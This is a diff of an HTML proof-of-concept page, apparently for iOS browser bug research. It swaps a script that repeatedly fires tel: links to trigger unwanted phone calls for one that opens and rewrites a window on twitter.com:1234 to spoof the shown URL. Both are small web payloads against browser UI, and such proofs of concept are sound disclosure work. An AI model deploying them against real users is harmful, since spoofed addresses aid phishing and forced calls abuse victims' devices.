@@ -1,77 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Auto Phone Call Spoofing on iOS</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 20px;
-    }
-    h2 {
-      font-size: 24px;
-    }
-    p {
-      font-size: 18px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 18px;
-      cursor: pointer;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Spoofing PoC on iOS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 20px;
+        }
+        h2 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 18px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-  <h2>PoC for Auto Phone Call Spoofing on iOS</h2>
+    <h2>URL Spoofing PoC for iOS</h2>
+    <p>This page simulates a URL spoofing behavior. Try to reload the page after clicking the button.</p>
+    
+    <button id="startBtn">Start PoC</button>
 
-  <p>The page will automatically attempt to trigger a spoofed phone call and redirect to Google.</p>
-  
-  <!-- This is optional, just for showing the status -->
-  <button id="callButton">Trigger Call</button>
+    <script>
+        // Function to initiate URL spoofing-like behavior
+        function spoofUrl() {
+            const newWindow = window.open('https://www.twitter.com:1234', 'testWindow', 'width=400,height=300');
+            setTimeout(function() {
+                newWindow.document.write('<h1>URL Spoofing...</h1>');
+                // Simulate the 'command + R' reload trigger
+                newWindow.location.reload();  // Reloads the new window (not the main page)
+            }, 2000);
+        }
 
-  <script>
-    // Function to initiate the phone call
-    function initiatePhoneCall() {
-      const spoofedPhoneNumber = "tel:+11234567890"; // Example phone number
-      window.location.href = spoofedPhoneNumber; // This attempts to trigger the call
-    }
+        // Button click listener to trigger the PoC
+        document.getElementById('startBtn').addEventListener('click', function() {
+            spoofUrl();
+        });
 
-    // Function to redirect to Google after a small delay
-    function redirectToGoogle() {
-      setTimeout(function() {
-        window.location.href = "https://www.google.com"; // Redirect to Google
-      }, 1000); // Delay to simulate time between phone bubble and redirect
-    }
-
-    // Automatically trigger the phone call after 2 seconds
-    window.onload = function() {
-      setTimeout(function() {
-        initiatePhoneCall();
-        redirectToGoogle();
-      }, 2000); // Trigger after 2 seconds
-    };
-
-    // For the button click (optional)
-    document.getElementById('callButton').addEventListener('click', function() {
-      initiatePhoneCall();
-      redirectToGoogle();
-    });
-
-    // Optional: Simulate taps or multiple calls if needed
-    setInterval(function() {
-      initiatePhoneCall();
-      redirectToGoogle();
-    }, 5000); // Try to trigger a call every 5 seconds and redirect to Google
-  </script>
+        // Instructions for iOS users
+        window.onload = function() {
+            alert('Click "Start PoC" then reload (swipe down or press Cmd+R on external keyboard).');
+        };
+    </script>
 </body>
 </html>
-
